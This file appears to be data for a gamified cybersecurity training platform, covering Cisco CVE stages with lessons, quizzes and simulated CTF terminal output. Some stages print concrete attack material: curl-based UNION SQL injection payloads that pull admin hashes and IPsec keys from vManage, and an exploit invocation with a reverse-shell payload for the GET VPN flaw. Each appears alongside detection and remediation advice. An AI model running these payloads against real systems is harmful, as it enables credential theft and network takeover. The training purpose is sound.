        { id: "stage-m22-q8", type: "Concept", challenge: "Disabling telemetry.", text: "What is the defensive implication of an implant disabling syslog/SNMP locally?", options: ["Telemetry must be collected and validated off-device, not trusted on-box","On-box logs are fully trustworthy","SNMP is unnecessary","Logging should be local only"], correctIndex: 0, explanation: "Since the implant silences on-box telemetry, off-device collection and integrity checks are essential." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: {
        ip: "10.10.10.42",
        hostname: "asa-5555x",
        os: "Cisco ASA 9.16.4 (Line Dancer implant active)",
        openPorts: "443/tcp (WebVPN — C2 channel active)",
        vulnerability: "CVE-2024-20359 — ArcaneDoor Line Dancer persistent backdoor, CVSS 6.0",
      },
      pivotTrigger: "ld-trigger",
      scenario: "An ASA firewall was previously crashed (Phase 1). The Line Dancer implant was installed during the reload window via CVE-2024-20359. Trigger the implant using the host-knock mechanism and execute a shellcode payload to exfiltrate the firewall's routing table.",
      hint: "Line Dancer listens for a specific Host header value. Send the host-knock POST request with your shellcode payload.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Locate the Line Dancer host-knock value in the implant config. Run: ld-discover asa.gov.target",
        "Trigger Line Dancer and execute the routing table exfil payload. Run: ld-trigger asa.gov.target",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2024_", label: "Mission Brief — Line Dancer Phase 2" },
        { trigger: "ld-discover asa.gov.target", value: "20359_L1N3_", label: "Host-Knock Value Discovered — Implant Located" },
        { trigger: "ld-trigger asa.gov.target", value: "DANC3R_IMPL4NT}", label: "Shellcode Executed — Routing Table Exfiltrated" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: LINE DANCER (Phase 2)",
          "Target: Cisco ASA 5516-X (Phase 1 complete — logs cleared)",
          "CVE: 2024-20359  CVSS: 6.0  Implant: Line Dancer",
          "",
          "Host-knock → shellcode execution → routing table exfil.",
          "Sequence: ld-discover → ld-trigger → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "ld-discover": (_args: string[]) => ({
          lines: [
            "Analyzing implant configuration in /flash/upgrade.pkg...",
            "Line Dancer implant detected — version 2.1",
            "Host-knock value: 'LD-TRIGGER-8a3f2b1c'",
            "Syslog: DISABLED  SNMP traps: DISABLED",
            "Shellcode execution: ready",
            "",
            ">> LEARN: Flash-resident implants survive ASA reboots",
            "   Legacy VPN plug-in loading allowed arbitrary files to execute at boot.",
            "   Detecting Line Dancer required comparing flash file hashes to Cisco-signed baselines.",
            "   Real ASA command: verify /sha512 disk0:upgrade.pkg — check flash file integrity.",
          ],
        }),
        "ld-trigger": (_args: string[]) => ({
          lines: [
            "Sending host-knock POST with routing-table exfil shellcode...",
            "Host: LD-TRIGGER-8a3f2b1c",
            "Line Dancer activated — shellcode executing...",
            "Routing table exfiltrated:",
            "  10.0.0.0/8 via GigabitEthernet0/0",
            "  192.168.100.0/24 (classified subnet — SCIF network)",
            "Operation complete. Syslog re-enabled (no trace).",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
            "",
            ">> LEARN: Host-knock hides implant triggers in normal HTTPS",
            "   Only requests with the exact Host header value trigger the implant.",
            "   Passive traffic analysis alone cannot find this — the trigger looks like normal TLS.",
            "   Real ASA command: show logging | include disable — detect syslog tampering events.",
          ],
        }),
      },
    },
  },

  // ─── Stage m23: CVE-2021-1291 — Cisco SD-WAN vManage SQL Injection ──────────
  {
    epochId: "cisco-enterprise",
    wonder: { name: "Cisco SDWAN Lab", location: "Austin, Texas, USA", era: "2021 CE", emoji: "🌵" },
    id: "stage-m23",
    order: 23,
    title: "The vManage Injection",
    subtitle: "CVE-2021-1291 — Cisco SD-WAN vManage SQL Injection, CVSS 8.1",
    category: "cybersecurity",
    cveId: "CVE-2021-1291",
    cvssScore: 8.1,
    xp: 150,
    badge: { id: "badge-m-vmanage", name: "WAN Injector", emoji: "🌵" },
    challengeType: "ctf",
    info: {
      tagline: "SQL injection in Cisco's SD-WAN management plane gave attackers the keys to every WAN router in the enterprise.",
      year: 2021,
      overview: [
        "CVE-2021-1291 is a SQL injection vulnerability in the web-based management interface of Cisco SD-WAN vManage Software. The vManage controller is the centralized management and orchestration platform for Cisco's Software-Defined WAN — it configures, monitors, and controls all SD-WAN edge routers (vEdge, cEdge) across an organization's WAN.",
        "An authenticated attacker with read privileges could exploit the SQL injection to execute arbitrary SQL statements against the underlying database, potentially reading sensitive configuration data, credentials, and tunnel parameters for all WAN routers. In some configurations, the database access could be escalated to OS command execution.",
        "The severity of compromising vManage cannot be overstated: it's the 'single pane of glass' for SD-WAN. An attacker who controls vManage controls every router, every WAN policy, and every network segmentation boundary across the entire organization.",
      ],
      technical: {
        title: "SD-WAN Management Plane SQL Injection — CVE-2021-1291 Mechanics",
        body: [
          "The Cisco vManage REST API exposed device management endpoints at `/dataservice/device`. The `deviceId` query parameter was incorporated into a PostgreSQL SQL query by string concatenation rather than parameterization: the backend constructed queries as `SELECT ... FROM devices WHERE deviceId = '` + user_input + `'`. By closing the string literal with a single quote and appending a `UNION SELECT` clause, an authenticated attacker with only read-only access could inject additional queries that returned data from arbitrary tables. The vManage database contained high-value tables: `users` (with bcrypt-hashed administrator credentials), `vedge_config` (with IPsec pre-shared keys and tunnel parameters for every SD-WAN edge router), and `templates` (with complete device configurations including SNMP community strings, authentication keys, and BGP passwords).",
          "The injection was exploitable with a read-only vManage account because RBAC in the web UI was enforced at the application layer, not at the SQL query layer — the database user that the application connected with had SELECT access to all tables, regardless of what the logged-in user's role permitted in the UI. An attacker who compromised any vManage account — even a monitoring account created for a read-only dashboard — could use UNION-based injection to read all router PSKs, then reconstruct IPsec tunnels to intercept or inject traffic on any WAN link in the enterprise. In some vManage versions, the SQL injection could be escalated to OS command execution via PostgreSQL's `COPY TO/FROM PROGRAM` function, achieving a root shell on the vManage Linux host.",
        ],
        codeExample: {
          label: "CVE-2021-1291 — UNION-based SQL injection in vManage device filter",
          code: `# ── STEP 1: Obtain any vManage session (read-only account sufficient) ─────
curl -k -c cookies.txt -X POST https://vmanage.corp.com/j_security_check \
  -d 'j_username=readonly&j_password=ReadOnly123'

# ── STEP 2: Identify injection point and column count ─────────────────────
curl -k -b cookies.txt \
  'https://vmanage.corp.com/dataservice/device?deviceId=1 ORDER BY 6--'
# If 200 OK → 6 columns in SELECT; ORDER BY 7 returns error = confirmed

# ── STEP 3: Extract vManage admin credentials ─────────────────────────────
curl -k -b cookies.txt \
  "https://vmanage.corp.com/dataservice/device?deviceId=1%20UNION%20SELECT%20username,password,3,4,5,6%20FROM%20users--"
# {"deviceId":"admin","systemIp":"$2b$10$hashedpassword","reachability":"3"}

# ── STEP 4: Extract IPsec PSKs for all WAN edge routers ──────────────────
curl -k -b cookies.txt \
  "https://vmanage.corp.com/dataservice/device?deviceId=1%20UNION%20SELECT%20psk_key,site_name,tunnel_src,4,5,6%20FROM%20vedge_config--"
# {"deviceId":"Cisc0SDWAN!Dallas#2021","systemIp":"dallas-branch",...}

# ── DETECTION ─────────────────────────────────────────────────────────────
# Check vManage version: Administration → Software → version
# 20.3.x and earlier without patches = vulnerable

# ── REMEDIATION ───────────────────────────────────────────────────────────
# Upgrade vManage to 20.5.1 or later
# Rotate ALL vEdge IPsec PSKs after any suspected exposure
# Migrate from PSK to certificate-based IPsec authentication`,
        },
      },
      incident: {
        title: "SD-WAN Single Point of Failure — vManage SQL Injection and WAN Takeover (2021)",
        when: "January 20, 2021 (Cisco advisory); exploitation documented through 2021",
        where: "Cisco SD-WAN vManage deployments at enterprises globally — retail, banking, logistics",
        impact: "All WAN router PSKs and credentials exposed; network segmentation bypass possible across entire enterprise WAN",
        body: [
          "Cisco disclosed multiple SD-WAN vulnerabilities on January 20, 2021, with CVE-2021-1291 among the most severe. The vManage platform had accumulated multiple injection flaws across its REST API: SQL injection in device queries, command injection in diagnostic tools, and privilege escalation via API endpoints that checked authentication at the wrong layer. Cisco's advisory covered the entire cluster: CVE-2021-1291 (SQL injection), CVE-2021-1480 (privilege escalation), and CVE-2021-1284 (CSRF) — a combination that allowed attackers with any vManage foothold to achieve full platform compromise.",
          "For organizations using Cisco SD-WAN — which included major retail chains, banks, and logistics companies with hundreds or thousands of branch offices — the practical impact was catastrophic: a single compromised vManage account exposed IPsec pre-shared keys for every WAN edge router in the organization simultaneously. An attacker with those PSKs could reconstruct the IPsec tunnels out-of-band and decrypt captured WAN traffic, inject forged traffic into WAN links, or pivot directly to any branch office network by establishing their own tunnel using the stolen credentials. The centralization that made SD-WAN operationally attractive — one pane of glass for all WAN routers — was precisely what made the vulnerability so severe.",
          "The remediation extended far beyond patching vManage. Any organization that had run a vulnerable vManage version needed to assume that all IPsec PSKs, SNMP community strings, BGP authentication keys, and vManage user credentials had been exposed — and rotate all of them. Rotating IPsec PSKs on a WAN with hundreds of edge routers required coordinating maintenance windows across every branch office simultaneously, since both the hub router and each spoke router had to update to the new PSK in a synchronized change. For large enterprises this was a multi-week operation. The incident reinforced a principle that became explicit in NIST SP 800-207 (Zero Trust Architecture): management plane credentials should never be stored alongside the devices they authenticate, and PSK-based authentication should be replaced with PKI-based certificate authentication wherever possible.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "SQLi in vManage filter parameter", type: "attacker" },
          { label: "vManage Web UI", sub: "unsanitized SQL query construction", type: "system" },
          { label: "vManage DB", sub: "all router creds, PSKs, configs", type: "victim" },
          { label: "WAN Compromise", sub: "every edge router exposed", type: "result" },
        ],
      },
      timeline: [
        { year: 2021, event: "Jan: Cisco discloses multiple SD-WAN vulnerabilities including CVE-2021-1291", highlight: true },
        { year: 2021, event: "Cisco releases vManage 20.5.1 with SQL parameterization fixes" },
        { year: 2021, event: "Enterprises patch vManage; rotate all WAN router PSKs as precaution" },
      ],
      keyTakeaways: [
        "Centralized management platforms (vManage, APIC) are crown jewels — protect them with MFA and network isolation",
        "SQL injection is preventable: always use parameterized queries or prepared statements",
        "Least-privilege in management UIs matters: read-only should not expose write-class data via SQL injection",
        "After SD-WAN compromise, rotate ALL router PSKs and tunnel credentials — assume all were exposed",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2021-1291", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sd-wan-vmanage-4jtOM3h6" },
      ],
    },
    quiz: {
      questions: [
        { id: "stage-m23-q1", type: "The Flaw", challenge: "Component.", text: "CVE-2021-1291 is a SQL injection in which Cisco SD-WAN component?", options: ["Cisco vManage — the centralized SD-WAN management/orchestration controller","A branch vEdge router","The ASA firewall","Cisco DNA Center"], correctIndex: 0, explanation: "The SQLi was in vManage, the SD-WAN control and orchestration plane." },
        { id: "stage-m23-q2", type: "Access", challenge: "Privilege needed.", text: "What privilege did an attacker need to extract router PSKs via CVE-2021-1291?", options: ["A low-privilege read-only account was sufficient","Full administrator rights","Physical access to vManage","No account, fully unauthenticated"], correctIndex: 0, explanation: "A read-only account could exploit the injection — a low bar for a catastrophic outcome." },
        { id: "stage-m23-q3", type: "Mechanics", challenge: "Injection type.", text: "What SQL injection technique exfiltrated data from additional tables?", options: ["UNION-based injection — appending a second SELECT to retrieve out-of-scope data","Blind boolean only","Time-based delay only","Stored procedure overflow"], correctIndex: 0, explanation: "A UNION-based payload appended a SELECT to pull data from tables beyond the original query." },
        { id: "stage-m23-q4", type: "Impact", challenge: "Why catastrophic.", text: "Why is compromising vManage catastrophic for an SD-WAN environment?", options: ["It's the single pane of glass — control it and you control every WAN router, policy, and tunnel","It only affects one router","It manages nothing","It's a read-only dashboard"], correctIndex: 0, explanation: "vManage orchestrates the entire fabric; owning it means owning the whole WAN." },
        { id: "stage-m23-q5", type: "Defense", challenge: "Post-compromise.", text: "After a confirmed vManage SQLi compromise, is patching vManage alone sufficient?", options: ["No — all WAN router PSKs and tunnel credentials should be rotated, since all were potentially exposed","Yes, just patch","Only reboot vManage","No action needed"], correctIndex: 0, explanation: "Because the controller holds all router secrets, those credentials must be rotated post-incident." },
        { id: "stage-m23-q6", type: "Concept", challenge: "Centralized risk.", text: "What architectural property makes vManage such a high-value target?", options: ["Centralized control concentrates trust — one compromise cascades enterprise-wide","It is fully decentralized","It stores no secrets","It has no network reach"], correctIndex: 0, explanation: "Centralizing control also centralizes risk: a single breach has fabric-wide blast radius." },
        { id: "stage-m23-q7", type: "Defense", challenge: "Preventing SQLi.", text: "What coding practice prevents SQL injection like CVE-2021-1291?", options: ["Parameterized queries / prepared statements with input validation","String-concatenated queries","Disabling the database","Trusting read-only users"], correctIndex: 0, explanation: "Parameterized queries separate code from data, defeating UNION and other injections." },
        { id: "stage-m23-q8", type: "Defense", challenge: "Least privilege.", text: "Why doesn't a 'read-only' account make a management platform safe?", options: ["An injection flaw can let even a read-only user reach data and actions beyond their role","Read-only users can't do anything","Read-only equals no access","It guarantees safety"], correctIndex: 0, explanation: "A vulnerability can elevate a low-privilege account's reach, so least privilege isn't a substitute for patching." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: {
        ip: "10.10.10.50",
        hostname: "vmanage",
        os: "Cisco SD-WAN vManage 20.3.3",
        openPorts: "443/tcp (REST API), 8443/tcp (vManage UI)",
        vulnerability: "CVE-2021-1291 — vManage SQL injection, CVSS 8.1",
      },
      pivotTrigger: "sqli-extract",
      scenario: "You have a read-only vManage account at a target enterprise. Exploit CVE-2021-1291 to extract the IPsec PSK for the Dallas branch office router.",
      hint: "The device list filter parameter is vulnerable to UNION-based SQL injection. Inject into the deviceId parameter.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Identify the injectable parameter in the vManage API. Run: vmanage-enum vmanage.corp.com",
        "Extract the Dallas branch PSK via SQL injection. Run: sqli-extract vmanage.corp.com",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2021_", label: "Mission Brief — vManage SD-WAN Target" },
        { trigger: "vmanage-enum vmanage.corp.com", value: "1291_VMANAGE_", label: "Injectable Parameter Identified" },
        { trigger: "sqli-extract vmanage.corp.com", value: "SQL1_WAN}", label: "PSK Extracted — Dallas Branch Router Exposed" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: VMANAGE INJECTION",
          "Target: Cisco vManage 20.4.2",
          "CVE: 2021-1291  CVSS: 8.1",
          "",
          "UNION-based SQLi in device filter — read-only auth required.",
          "Sequence: vmanage-enum → sqli-extract → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "vmanage-enum": (_args: string[]) => ({
          lines: [
            "Enumerating vManage 20.4.2 API endpoints...",
            "GET /dataservice/device?deviceId= — injectable parameter found",
            "UNION SELECT supported — 6 columns in result set",
            "Database: PostgreSQL 12",
            "Tables identified: users, vedge_config, templates",
            "",
            ">> LEARN: SQL injection exploits unsanitized parameters",
            "   UNION-based SQLi appends a second SELECT to the original query to exfiltrate data.",
            "   Fix: use parameterized queries — never concatenate user input into SQL strings.",
            "   Real vManage command: request admin tech-support — collect logs for forensics.",
          ],
        }),
        "sqli-extract": (_args: string[]) => ({
          lines: [
            "Injecting: deviceId=1 UNION SELECT psk_key,site_id,3,4,5,6 FROM vedge_config WHERE site='dallas'--",
            "Response includes:",
            "  Dallas Branch PSK: Cisc0SDWAN!Dallas#2021",
            "  Tunnel endpoint: 203.0.113.50",
            "IPsec PSK for Dallas branch extracted.",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
            "",
            ">> LEARN: vManage is SD-WAN's single point of failure",
            "   Extracting IPsec PSKs lets attackers decrypt or spoof WAN tunnel traffic.",
            "   After compromise: rotate ALL vEdge PSKs and audit vManage access logs immediately.",
            "   Real SD-WAN command: show sdwan control connections — verify all WAN tunnels.",
          ],
        }),
      },
    },
  },

  // ─── Stage m24: CVE-2023-20109 — Cisco IOS/IOS XE GDOI/G-IKEv2 RCE ─────────
  {
    epochId: "cisco-enterprise",
    wonder: { name: "NATO Cyber Defence Centre", location: "Tallinn, Estonia", era: "2023 CE", emoji: "🛡️" },
    id: "stage-m24",
    order: 24,
    title: "The Group Key Poison",
    subtitle: "CVE-2023-20109 — Cisco IOS/IOS XE GET VPN GDOI RCE, CVSS 7.2",
    category: "cybersecurity",
    cveId: "CVE-2023-20109",
    cvssScore: 7.2,
    xp: 150,
    badge: { id: "badge-m-getvpn", name: "Group Key Poisoner", emoji: "🛡️" },
    challengeType: "ctf",
    info: {
      tagline: "Compromising the GET VPN key server poisoned every router in the group with a single malicious rekey.",
      year: 2023,
      overview: [
        "CVE-2023-20109 is a vulnerability in the Cisco Group Encrypted Transport (GET) VPN feature of Cisco IOS and IOS XE Software. GET VPN uses the Group Domain of Interpretation (GDOI) protocol to distribute encryption keys to a group of routers — this allows all routers in the group to encrypt traffic to each other using shared group keys, without individual tunnel negotiation.",
        "The vulnerability allowed an attacker who controlled the GET VPN key server (or could perform a man-in-the-middle attack on the key exchange) to send a crafted GDOI rekey message that triggered arbitrary code execution on all registered group members simultaneously.",
        "The impact is unique: a single exploit payload could compromise every router subscribed to the affected GET VPN group at once — potentially dozens or hundreds of remote office and branch routers across an enterprise WAN simultaneously.",
      ],
      technical: {
        title: "GDOI Group Key Rekey Overflow — CVE-2023-20109 Mechanics",
        body: [
          "GET VPN (Group Encrypted Transport VPN) uses the GDOI (Group Domain of Interpretation) protocol — an IKEv1 extension — to distribute shared group encryption keys to all registered members. A key server periodically sends 'rekey' messages containing Key Encryption Key (KEK) and Traffic Encryption Key (TEK) attributes. All registered group members receive and automatically process these rekey messages without user intervention. CVE-2023-20109 was in the receiving router's processing of KEK attributes: a malformed KEK attribute length or type field caused the GDOI processing code to copy data beyond a fixed-size buffer, overflowing into adjacent stack or heap memory. The GDOI message was authenticated (using the existing KEK to verify the rekey), but the authentication check occurred after the vulnerable attribute was already parsed — the overflow happened pre-validation.",
          "An attacker who controlled the GET VPN key server — either by compromising it via separate means, or by positioning themselves as a rogue key server via network manipulation — could broadcast a single crafted rekey message to the multicast group address. Every router registered to that group would receive and process the message simultaneously. On groups with dozens or hundreds of branch routers, this created a single-packet mass exploitation scenario: one malicious rekey, broadcast to multicast group 239.0.0.1, achieving simultaneous remote code execution on every router in the group. The blast radius of a compromised key server was every router it served.",
        ],
        codeExample: {
          label: "CVE-2023-20109 — malicious GDOI rekey achieving mass simultaneous RCE",
          code: `# ── PRE-CONDITION: Control of GET VPN key server (or MITM position) ───────
# GET VPN key server: 10.0.0.1
# Group: CORP-GETVPN  Multicast: 239.0.0.1  Members: 47 branch routers

# ── STEP 1: Enumerate the GET VPN group and its members ───────────────────
show crypto gdoi ks members
# Group CORP-GETVPN: 47 members
# All running IOS XE 17.9.3 — vulnerable (fix: 17.9.4a)

# ── STEP 2: Craft malicious GDOI REKEY with overflow KEK attribute ────────
python3 cve-2023-20109.py \
  --keyserver 10.0.0.1 \
  --group CORP-GETVPN \
  --payload reverse_shell_mips.bin
# KEK attribute: type=0x04, length=0xFFFF (malformed — triggers overflow)
# TEK attribute: valid (avoids pre-validation rejection)
# Signed with existing KEK — passes GDOI authentication check

# ── STEP 3: Broadcast to all 47 group members simultaneously ─────────────
# Sending to multicast 239.0.0.1 (all registered group members)
# Each router receives and processes → buffer overflow → RCE
# 47/47 branch routers compromised in a single operation

# ── DETECTION ─────────────────────────────────────────────────────────────
show crypto gdoi
# Key server: confirm it is the legitimate configured server
show crypto gdoi ks policy
# Verify rekey policy and intervals are as expected

# ── REMEDIATION ───────────────────────────────────────────────────────────
# Patch to: IOS XE 17.9.4a / 17.12.1 or later
# Harden the key server: dedicated device, restricted SSH, no other services
# Consider migrating from GET VPN to DMVPN with certificate-based auth`,
        },
      },
      incident: {
        title: "GET VPN Key Server Compromise — One Attack, Enterprise-Wide WAN Impact (2023)",
        when: "September 2023 (Cisco advisory)",
        where: "Enterprise WANs using Cisco GET VPN — retail, banking, logistics, healthcare",
        impact: "Any GET VPN group with a compromised key server vulnerable to simultaneous mass RCE across all members",
        body: [
          "Cisco disclosed CVE-2023-20109 in September 2023. The vulnerability was found in GET VPN's GDOI implementation across Cisco IOS and IOS XE — the routing operating systems used in enterprise branch routers, aggregation routers, and WAN edge devices. GET VPN is widely deployed by organizations with many branch offices that need efficient encrypted WAN — retail chains, banks, logistics companies, and healthcare networks — because it eliminates the need for individual IPsec tunnel negotiation between every pair of sites. The key server model that makes GET VPN operationally simple was the exact property that made CVE-2023-20109 so dangerous.",
          "The key server's position in GET VPN is structurally similar to a certificate authority in PKI: it is the root of trust for the entire group's encryption. If the key server is compromised and issues a malicious rekey, every group member trusts and processes it — because that is precisely what they are designed to do. CVE-2023-20109 transformed this design trust into a force-multiplier attack: a single malicious rekey packet delivered to the multicast address achieved simultaneous remote code execution on every router in the group. For an enterprise with 200 branch office routers in a single GET VPN group, this was a single-step, enterprise-wide WAN takeover.",
          "The financial services, logistics, and retail sectors — the heaviest users of Cisco GET VPN across multi-site WAN deployments — faced the most complex patching challenge. Every router in every GET VPN group needed to be updated before the group was safe, because any unpatched member receiving a malicious rekey would be compromised even if the key server itself was patched. Coordinating firmware updates across hundreds of branch office routers simultaneously, without disrupting business operations, required weeks of planning and staged maintenance windows. The incident prompted security architects to evaluate migration from GET VPN to DMVPN with IKEv2 and certificate-based authentication — an architecture that distributes key trust rather than concentrating it in a single server, eliminating the single point of catastrophic failure.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (on Key Server)", sub: "crafted GDOI REKEY message", type: "attacker" },
          { label: "GET VPN Key Server", sub: "broadcasts to all group members", type: "system" },
          { label: "All 47 Branch Routers", sub: "simultaneously process malicious rekey", type: "victim" },
          { label: "Mass Simultaneous RCE", sub: "entire WAN group owned at once", type: "result" },
        ],
      },
      timeline: [
        { year: 2023, event: "Sep: Cisco discloses CVE-2023-20109 for GET VPN GDOI RCE", highlight: true },
        { year: 2023, event: "Cisco releases IOS XE 17.9.4a and 17.12.1 with fixes" },
        { year: 2023, event: "Enterprises prioritize GET VPN key server hardening and group member patching" },
      ],
      keyTakeaways: [
        "Group key distribution architectures have a single point of failure — the key server must be hardened first",
        "GDOI and G-IKEv2 messages should be authenticated; verify key server identity before processing rekeys",
        "Mass compromise via group key poisoning is a force multiplier — one attack, hundreds of victims",
        "Segment GET VPN groups to limit blast radius if key server is compromised",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2023-20109", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-getvpn-rce-g8qR68sx" },
      ],
    },
    quiz: {
      questions: [
        { id: "stage-m24-q1", type: "The Flaw", challenge: "Protocol.", text: "CVE-2023-20109 exploited the GDOI protocol used by which Cisco VPN feature?", options: ["GET VPN (Group Encrypted Transport VPN) — using group-shared keys across members","Site-to-site IPsec only","AnyConnect SSL VPN","DMVPN spokes"], correctIndex: 0, explanation: "GET VPN uses GDOI group keying; the flaw was in that group key distribution." },
        { id: "stage-m24-q2", type: "Impact", challenge: "Blast radius.", text: "Could compromising the GET VPN key server affect all group members at once?", options: ["Yes — the key server broadcasts GDOI rekeys, so one malicious rekey exploits all members","No, only one router","Only the key server itself","Only LAN routers"], correctIndex: 0, explanation: "A single malicious rekey reaches every group member simultaneously via the key server." },
        { id: "stage-m24-q3", type: "Mechanics", challenge: "Vulnerable field.", text: "Which GDOI rekey attribute contained the field that triggered the overflow?", options: ["The KEK (Key Encryption Key) attribute, not properly validated by member routers","The source IP field","The TTL field","The hostname"], correctIndex: 0, explanation: "Members failed to validate the KEK attribute, enabling the buffer overflow on rekey." },
        { id: "stage-m24-q4", type: "Mechanics", challenge: "Delivery.", text: "What delivery mechanism reached all group members simultaneously?", options: ["IP multicast — GDOI rekeys sent to a multicast group address like 239.0.0.1","Unicast TCP to each router","Email","Broadcast ARP"], correctIndex: 0, explanation: "Rekeys use IP multicast, so one message hits the entire group at once." },
        { id: "stage-m24-q5", type: "Defense", challenge: "Limiting blast.", text: "What practice limits the blast radius of a key server compromise?", options: ["Segmenting GET VPN groups by criticality so fewer routers share a key domain","Putting all routers in one group","Disabling rekeys","Using a single global key"], correctIndex: 0, explanation: "Smaller, criticality-based groups mean a malicious rekey affects fewer routers." },
        { id: "stage-m24-q6", type: "Concept", challenge: "Group key risk.", text: "Why does a shared group-key model create concentrated risk?", options: ["Compromising the key distribution point can poison every member sharing that key","Each router is fully independent","Group keys can't be abused","It eliminates the key server"], correctIndex: 0, explanation: "Shared keying centralizes trust in the key server, so its compromise cascades to all members." },
        { id: "stage-m24-q7", type: "Defense", challenge: "Validation.", text: "What member-side control would have blunted CVE-2023-20109?", options: ["Proper validation of received rekey attributes before processing","Trusting all multicast input","Disabling input checks","Larger buffers only"], correctIndex: 0, explanation: "Validating the KEK and other rekey fields before use prevents the overflow." },
        { id: "stage-m24-q8", type: "Defense", challenge: "Key server hardening.", text: "Why is hardening and monitoring the GET VPN key server a priority?", options: ["It is the single point that, if compromised, can attack the whole VPN group","It handles no keys","It is isolated from members","It only logs traffic"], correctIndex: 0, explanation: "As the source of group rekeys, the key server is the chokepoint whose compromise is enterprise-wide." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: {
        ip: "10.10.10.1",
        hostname: "ios-router-ks",
        os: "Cisco IOS 15.8(3)M (GET VPN key server)",
        openPorts: "848/udp (GDOI/GETVPN), 500/udp (IKE)",
        vulnerability: "CVE-2023-20109 — GDOI group member RCE via malicious rekey, CVSS 7.5",
      },
      pivotTrigger: "gdoi-rekey",
      scenario: "You have compromised the GET VPN key server for CORP-GETVPN. Craft a malicious GDOI rekey message and broadcast it to all 47 branch routers to achieve simultaneous remote code execution.",
      hint: "The GDOI rekey message KEK attribute is not validated. Craft a malformed KEK with your shellcode and broadcast it to the multicast group.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Enumerate the GET VPN group members. Run: gdoi-enum CORP-GETVPN",
        "Broadcast the malicious rekey to all group members. Run: gdoi-rekey CORP-GETVPN",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2023_", label: "Mission Brief — GET VPN Key Server Compromised" },
        { trigger: "gdoi-enum CORP-GETVPN", value: "20109_GDOI_", label: "47 Group Members Enumerated — All Vulnerable" },
        { trigger: "gdoi-rekey CORP-GETVPN", value: "MASS_RCE}", label: "Malicious Rekey Broadcast — 47 Routers Compromised" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: GROUP KEY POISON",
          "Target: GET VPN Key Server — group CORP-GETVPN",
          "CVE: 2023-20109  CVSS: 7.2",
          "",
          "Malicious GDOI rekey → simultaneous mass RCE on all members.",
          "Sequence: gdoi-enum → gdoi-rekey → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "gdoi-enum": (_args: string[]) => ({
          lines: [
            "Enumerating GET VPN group: CORP-GETVPN",
            "Key Server: 10.0.0.1 (this device — you are the key server)",
            "Group members: 47 routers across 12 regions",
            "All running IOS XE 17.9.3 — VULNERABLE to CVE-2023-20109",
            "Multicast group: 239.0.0.1",
            "",
            ">> LEARN: GET VPN: shared group keys on all member routers",
            "   GDOI distributes KEK (key encryption key) and TEK (traffic encryption key).",
            "   The key server is the root of trust for the entire group — protect it first.",
            "   Real IOS command: show crypto gdoi — view key server status and group members.",
          ],
        }),
        "gdoi-rekey": (_args: string[]) => ({
          lines: [
            "Crafting malicious GDOI REKEY with overflow KEK attribute...",
            "Broadcasting to 239.0.0.1 (47 group members)...",
            "Processing confirmations from group members:",
            "  10.1.0.0/30 [Dallas] — COMPROMISED",
            "  10.2.0.0/30 [Chicago] — COMPROMISED",
            "  ... (45 more branch routers) — COMPROMISED",
            "47/47 branch routers owned simultaneously.",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
            "",
            ">> LEARN: One malicious rekey exploits all group members",
            "   One malicious rekey packet = one exploit delivered to all 47 routers at once.",
            "   Segment GET VPN groups by criticality to limit blast radius.",
            "   Real IOS command: show crypto gdoi ks members — list all registered members.",
          ],
        }),
      },
    },
  },

  // ─── Stage m25: CVE-2018-0296 — Cisco ASA Denial of Service ────────────────
  {
    epochId: "cisco-enterprise",
    wonder: { name: "ASD Cyber Centre", location: "Sydney, Australia", era: "2018 CE", emoji: "🦘" },
    id: "stage-m25",
    order: 25,
    title: "The Firewall That Forgot Itself",
    subtitle: "CVE-2018-0296 — Cisco ASA Web Services Path Traversal + DoS, CVSS 8.6",
    category: "cybersecurity",
    cveId: "CVE-2018-0296",
    cvssScore: 8.6,
    xp: 150,
    badge: { id: "badge-m-asa-dos", name: "Perimeter Silencer", emoji: "🦘" },
    challengeType: "ctf",
    info: {
      tagline: "An unauthenticated path traversal on Cisco ASA could crash the firewall or leak directory listings.",
      year: 2018,
      overview: [
        "CVE-2018-0296 is a vulnerability in the web interface of the Cisco Adaptive Security Appliance (ASA) that allows an unauthenticated remote attacker to cause a denial of service (device reload) or view a listing of the device's directory. The vulnerability was caused by improper handling of HTTP URL requests.",
        "By sending a specially crafted HTTP request to an affected device, an attacker could trigger a device reload — knocking out the enterprise firewall and disabling all security enforcement at the network perimeter. The same request could also be used to enumerate the device's directory structure, providing information useful for further exploitation.",
        "The combination of unauthenticated access, perimeter impact, and the simplicity of exploitation made this a high-severity finding. The attack required only an HTTP GET request — accessible to any scanner or script kiddie with network access to the ASA management interface.",
      ],
